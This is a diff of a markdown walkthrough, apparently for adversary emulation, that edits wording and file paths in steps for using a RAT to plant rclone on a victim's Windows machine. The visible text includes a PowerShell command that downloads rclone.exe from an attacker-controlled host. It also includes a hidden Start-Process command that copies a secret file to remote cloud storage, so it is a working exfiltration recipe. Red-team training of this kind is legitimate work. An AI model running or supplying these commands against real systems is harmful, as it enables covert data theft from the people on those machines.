@@ -102,7 +102,7 @@ To simulate real-world behavior and avoid direct upload via RAT:
 
 ### 4. **Use RAT (PowerShell Shell) to Download Files on Victim**
 
-Go through **File Manager** to the expected folder and upload the **reclone.conf**, as it is small in size that's why we can upload it directly via RAT. But as the **rclone.exe** is big in size, thats why we need to send it via power shall. From attacker, send PowerShell commands via RAT. You can do the same for the **rclone.conf** also.
+Go through **File Manager** to the expected folder and upload the **reclone.conf**, as it is small in size that's why we can upload it directly via RAT. But as the **rclone.exe** is big in size, thats why we need to send it via power shall. From the attacker, send PowerShell commands via RAT. You can do the same for the **rclone.conf** also.
 
 ```powershell
 Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\ProgramData\rclone.exe"
@@ -122,7 +122,7 @@ Now `rclone.exe` and its config are on the **victim system**.
 Send via RAT: 
 
 ```powershell
-Start-Process -WindowStyle Hidden -FilePath "C:\ProgramData\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\secret.txt" myStorage:/ --config "C:\ProgramData\rclone.conf"'
+Start-Process -WindowStyle Hidden -FilePath "C:\PublicRAT\rclone.exe" -ArgumentList 'copy "C:\Users\Public\Documents\newSecret.txt" myStorage:/ --config "C:\PublicRAT\rclone.conf"'
 ```
 
 Notes:
